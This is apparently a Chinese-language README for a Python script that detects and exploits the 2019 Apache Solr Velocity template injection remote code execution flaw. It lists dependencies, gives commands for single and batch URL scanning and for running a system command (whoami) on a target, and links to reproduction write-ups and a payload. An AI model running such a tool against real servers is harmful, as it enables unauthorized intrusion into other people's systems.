## 依赖库

requests

threading

json

optparse

## 使用

单url检测

python3 apache-solr-rce-201910.py -u http://xxx:8983/solr/new_core

批量url检测

python3 apache-solr-rce-201910.py -L url.txt

命令执行

python3 apache-solr-rce-201910.py -u http://xxx:8983/solr/new_core --command whoami

## 参考

[[漏洞复现\] Apache Solr RCE](https://www.cnblogs.com/mark-zh/p/11775851.html)

[Apache Solr velocity模板注入RCE漏洞复现](https://blog.csdn.net/qq_18501087/article/details/102854324)

[Apache Solr最新RCE漏洞分析](https://www.freebuf.com/vuls/218730.html)

[payload by S00py](https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt)

